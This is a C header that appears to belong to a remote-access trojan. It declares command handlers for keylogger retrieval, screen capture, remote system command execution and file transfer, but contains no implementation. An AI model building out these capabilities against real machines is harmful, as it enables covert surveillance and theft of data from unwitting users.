#ifndef __COMMANDS_H
#define __COMMANDS_H

#define COMMANDS_APPROVE '+'
#define COMMANDS_DISAPPROVE '-'

#define COMMANDS_SEND 1
#define COMMANDS_INFO 2
#define COMMANDS_TERMINATE 3
#define COMMANDS_SYSTEM 4
#define COMMANDS_KEYLOGGER_GET 5
#define COMMANDS_KEYLOGGER_SIZE 6
#define COMMANDS_KEYLOGGER_CLEAR 7
#define COMMANDS_SCREEN_GET 8
#define COMMANDS_GET_FILE 9
#define COMMANDS_SEND_FILE 10
#define COMMANDS_TOTAL_COMMANDS 11

#define COMMANDS_ARGS_SEP ','
#define COMMANDS_UNKNOW_COMMAND -9
#define COMMANDS_SUCC 1
#define COMMANDS_DONT_SEEDUP 2

extern int commands_Translate(char* msg);
extern int commands_ExportArg(char** msg, char** arg, int startIndex);
extern int command_Send(char* msg, int len);
extern int command_Info(void);
extern int command_Terminate(void);
extern int command_System(char* msg, int len);
extern int command_Keylogger_Get(char* msg, int len);
extern int command_Keylogger_Size(void);
extern int command_Keylogger_Clear(void);
extern int command_Screen_Get(char* msg, int len);
extern int command_Get_File(char* msg, int len);
extern int command_Send_File(char* msg, int len);

#endif